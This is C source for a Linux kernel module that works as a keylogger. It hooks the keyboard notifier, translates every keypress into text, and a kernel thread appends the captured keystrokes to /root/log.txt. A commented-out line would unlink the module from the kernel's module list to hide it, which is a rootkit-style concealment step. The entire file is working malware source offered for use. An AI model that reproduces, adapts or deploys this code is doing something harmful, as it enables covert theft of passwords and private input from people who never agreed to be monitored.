/*
 * This is the template file used to build a system
 * specific kernel module.
*/

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/errno.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/syscalls.h>
#include <linux/kthread.h>
#include <linux/fs.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/semaphore.h>
#include <linux/wait.h>

MODULE_LICENSE("Apache");

/*
 * -- Global defines --
 */
#define PATH "/root/log.txt"
#define MAX_BUFFER_SIZE 150
#define MAX_KEY_SIZE 6

/*
 * -- Thread data --
 */
static struct task_struct *writer;
wait_queue_head_t my_queue;
static int flag = 0;
static int bufforToSave = 0;

/*
 * -- Keyboard Notifier --
 */
struct semaphore s;
static int shiftPressed = 0;

//buffers
char keyBuffer[200];
const char* endPtr = (keyBuffer+(sizeof(keyBuffer)-1));
char* basePtr = keyBuffer;
static int bufferIndex = 0;

char keyBuffer2[200];
const char* endPtr2 = (keyBuffer2+(sizeof(keyBuffer2)-1));
char* basePtr2 = keyBuffer2;
static int bufferIndex2 = 0;

//which buffer is using
static int bufferState = 0;

//Key press without shift
static const char* keys[] = {"","[ESC]","1","2","3","4","5","6","7","8","9",
				"0","-","=","[BS]","[TAB]","q","w","e","r",
				"t","y","u","i","o","p","[","]","[ENTR]",
				"[CTRL]","a","s","d","f","g","h","j","k","l",
				";","'","`","[SHFT]","\\","z","x","c","v","b",
				"n","m",",",".","/","[SHFT]","",""," ",
				"[CAPS]","[F1]","[F2]","[F3]","[F4]","[F5]",
				"[F6]","[F7]","[F8]","[F9]","[F10]","[NUML]",
				"[SCRL]","[HOME]","[UP]","[PGUP]","-","[L]","5",
				"[R]","+","[END]","[D]","[PGDN]","[INS]",
				"[DEL]","","","","[F11]","[F12]","",
				"","","","","","","[ENTR]","[CTRL]",
				"/","[PSCR]","[ALT]","","[HOME]","[U]",
				"[PGUP]","[L]","[R]","[END]","[D]","[PGDN]",
				"[INS]","[DEL]","","","","","","","","[PAUS]"};

//Key press with shift
static const char* keysShift[] = {"","[ESC]","!","@","#","$","%","^","&","*",
				"(",")","_","+","[BS]","[TAB]","Q","W","E","R",
				"T","Y","U","I","O","P","{","}","[ENTR]",
				"[CTRL]","A","S","D","F","G","H","J","K","L",
				":","\"","~","[SHFT]","|","Z","X","C","V","B",
				"N","M","<",">","?","[SHFT]","",""," ",
				"[CAPS]","[F1]","[F2]","[F3]","[F4]","[F5]",
				"[F6]","[F7]","[F8]","[F9]","[F10]","[NUML]",
				"[SCRL]","[HOME]","[U]","[PGUP]","-","[L]","5",
				"[R]","+","[END]","[D]","[PGDN]","[INS]",
				"[DEL]","","","","[F11]","[F12]","",
				"","","","","","","[ENTR]","[CTRL]",
				"/","[PSCR]","[ALT]","","[HOME]","[U]",
				"[PGUP]","[L]","[R]","[END]","[D]","[PGDN]",
				"[INS]","[DEL]","","","","","","","","[PAUS]"};

//On key notify event, catch and run handler
int key_notify(struct notifier_block *nblock, unsigned long kcode, void *p)
{
	struct keyboard_notifier_param *param = p;

   	if(kcode == KBD_KEYCODE)
   	{
		// left or right shift
    	if( param->value==42 || param->value==54 )
    	{      		
    		down(&s);
    		if(param->down > 0)
    		{
        		shiftPressed = 1;
			}
            else
            {
                shiftPressed = 0;
			}
        	up(&s);
        	return NOTIFY_OK;
    	}

		//Store keys to buffer
    	if(param->down)
    	{
			int i;
			char c;
			int iLen;
			iLen = 0;
			i = 0;
			down(&s);

        	if(shiftPressed)
        	{
        		iLen = strlen(keysShift[param->value]);
        	}
        	else
        	{
        		iLen = strlen(keys[param->value]);
        	}


			while(i < iLen)
			{
				// Save data to 1st buffer
				if(bufferState == 0)
				{
					// Have space in buffer
					if(bufferIndex + (MAX_KEY_SIZE - i) <= MAX_BUFFER_SIZE)
					{
						bufferIndex++;

						if(shiftPressed)
			        	{
			        		c = keysShift[param->value][i];
			        	}
			        	else
			        	{
			        		c = keys[param->value][i];
			        	}
		                
		                i++;
		                *basePtr = c;
		                basePtr++;
	            	}
	            	else
	            	{
	            		// save current buffer to file
	            		bufforToSave = 0;
	            		flag = 1;
						wake_up_interruptible(&my_queue);

						// store date to 2nd buffer
						if(shiftPressed)
			        	{
			        		c = keysShift[param->value][i];
			        	}
			        	else
			        	{
			        		c = keys[param->value][i];
			        	}

		                i++;
		                *basePtr2 = c;
		                basePtr2++;
		                bufferIndex2++;

		                bufferState = 1;
	            	}
            	}
            	else // save data to 2nd buffer
            	{
            		// Have space in buffer
					if(bufferIndex2 + (MAX_KEY_SIZE - i) <= MAX_BUFFER_SIZE)
					{
						bufferIndex2++;

		                if(shiftPressed)
			        	{
			        		c = keysShift[param->value][i];
			        	}
			        	else
			        	{
			        		c = keys[param->value][i];
			        	}

		                i++;
		                *basePtr2 = c;
		                basePtr2++;
	            	}
	            	else
	            	{
	            		// save current buffer to file
	            		bufforToSave = 1;
	            		flag = 1;
						wake_up_interruptible(&my_queue);

						// store date to 1st buffer
						if(shiftPressed)
			        	{
			        		c = keysShift[param->value][i];
			        	}
			        	else
			        	{
			        		c = keys[param->value][i];
			        	}

		                i++;
		                *basePtr = c;
		                basePtr++;
		                bufferIndex++;

		                bufferState = 0;
	            	}
            	}
            }
			up(&s);
    	}
    }
 	return NOTIFY_OK;
}

//Notifier handler
static struct notifier_block nb = {
    .notifier_call = key_notify
};

// File open, write and close.
// Concurrency is not a concern since only one thread has access.
// (@File path, @offset, @buffer to save, @size of buffer, @flags, @open mode)
int kwrite(const char *fp, loff_t off, char *buf, unsigned int size, int flags, int mode)
{
	int ret;
	struct file *file;
	mm_segment_t old_fs = get_fs();
	set_fs(get_ds());
	file = filp_open(fp, flags, mode);
	ret = vfs_write(file, buf, size, &off);
	filp_close(file, NULL);
	set_fs(old_fs);
	return ret;
}

// write thread writes buffer from last bufferState, then waits on wait queue
int write_timer(void *data)
{
	while(1)
	{
		// sleep until we set correct flag
		wait_event_interruptible(my_queue, flag != 0);

		if(flag != 2)
		{
			flag = 0;

			if(bufforToSave == 0)
			{
				kwrite(PATH, 0, keyBuffer, bufferIndex, O_WRONLY|O_CREAT|O_APPEND, 0664);
				memset(keyBuffer, 0, sizeof(keyBuffer));
				basePtr = keyBuffer;
				bufferIndex = 0;

			}
			else
			{
				kwrite(PATH, 0, keyBuffer2, bufferIndex2, O_WRONLY|O_CREAT|O_APPEND, 0664);
				memset(keyBuffer2, 0, sizeof(keyBuffer2));
				basePtr2 = keyBuffer2;
				bufferIndex2 = 0;
			}
		}

		// Exit call saves remainin buffer contents to log
		if(kthread_should_stop())
		{
			if(bufforToSave == 1)
			{
				kwrite(PATH, 0, keyBuffer, bufferIndex, O_WRONLY|O_CREAT|O_APPEND, 0664);
				kwrite(PATH, 0, keyBuffer2, bufferIndex2, O_WRONLY|O_CREAT|O_APPEND, 0664);
			}
			else
			{
				kwrite(PATH, 0, keyBuffer2, bufferIndex2, O_WRONLY|O_CREAT|O_APPEND, 0664);
				kwrite(PATH, 0, keyBuffer, bufferIndex, O_WRONLY|O_CREAT|O_APPEND, 0664);
			}			
			return 0;
		}
	}
	return 0;
}

/*
 * --Initialise & Exit Module code--
 */
static int init_mod(void)
{
	//Listen for keys.
	register_keyboard_notifier(&nb);
	sema_init(&s, 1);        
	
	//Register a character device
	memset(keyBuffer, 0, sizeof(keyBuffer));
	memset(keyBuffer2, 0, sizeof(keyBuffer2));

	init_waitqueue_head(&my_queue);

	// Start print thread
	writer = kthread_run(write_timer, NULL, "runner");
	return 0;
}

static void exit_mod(void)
{
	// remove our notifier block from the system
	unregister_keyboard_notifier(&nb);

	// Stop print thread
	flag = 2;
	kthread_stop(writer);
	
	// delete module from module's list
	// if deleted, module cannot be unloaded
	//list_del(&THIS_MODULE->list);

	memset(keyBuffer, 0, sizeof(keyBuffer));
	return;
}

module_init(init_mod);
module_exit(exit_mod);
